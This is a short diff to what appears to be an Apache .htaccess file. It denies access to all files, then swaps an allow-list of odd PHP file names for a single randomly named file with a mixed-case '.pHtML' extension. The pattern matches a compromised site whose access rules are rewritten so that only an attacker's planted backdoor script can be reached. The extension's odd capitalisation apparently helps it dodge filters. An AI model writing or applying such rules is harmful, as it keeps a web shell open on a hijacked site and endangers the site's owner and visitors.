@@ -5,11 +5,12 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(adodbd-inc.php|Neraca.php|DateImmutableHype.php|SettingComparator.php|InvalidQuestion.php|ValidateMenu.php)$">
+<FilesMatch "^(68986ca6b9695.pHtML)$">
 Order allow,deny
 Allow from all
 
 </FilesMatch>
+
 
 
 
